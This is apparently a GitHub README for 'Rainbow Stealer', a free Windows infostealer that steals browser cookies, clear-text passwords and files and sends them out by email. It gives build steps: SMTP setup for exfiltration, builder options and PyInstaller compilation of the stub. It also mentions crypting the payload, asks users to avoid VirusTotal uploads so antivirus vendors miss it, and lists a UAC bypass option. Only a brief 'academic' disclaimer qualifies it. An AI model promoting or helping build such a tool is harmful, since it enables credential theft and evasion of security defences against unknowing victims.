# Rainbow Stealer
![alt text](https://github.com/syrex1013/Rainbow_stealer/blob/master/banner.jpg)
### Free, Open-Source Stealer for Windows OS.         
Rainbow is data stealer coded in C#/Python. The use ranges from stealing browser cookies, to exfiltraiting sensitive files,clear-text passwords and more!.        
![alt text](https://github.com/syrex1013/Rainbow_stealer/blob/master/features.jpg)
### Dependencies.
* .NET Framework 4.0 or higher.
* Python 3.8 (Should work on any 3.X)
* PyInstaller
### Usage
1. First you need to setup your email data used to exfiltrate information.          
![alt text](https://github.com/syrex1013/Rainbow_stealer/blob/master/SMTP.png)
2. Then you need to set options and build your stealer.             
![alt text](https://github.com/syrex1013/Rainbow_stealer/blob/master/options.png)
![alt text](https://github.com/syrex1013/Rainbow_stealer/blob/master/build.png)
3. In the current directory file called "stub2.py" will appear. You need to compile it using command:           
`pyinstaller --onefile stub2.py`
### Important Information
* Created file is crypted. If you want to crypt it you need crypter. PythonCrypter coming soon :D
* Please do not upload to websitest that distribute files. Example: virustotal.com
* Want more features? Please write in issue section.
* UAC Bypass option is for Windows 10. It uses fudhelper.exe exploit.
### Disclaimer
*This project is purely academic, use at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization.*

  
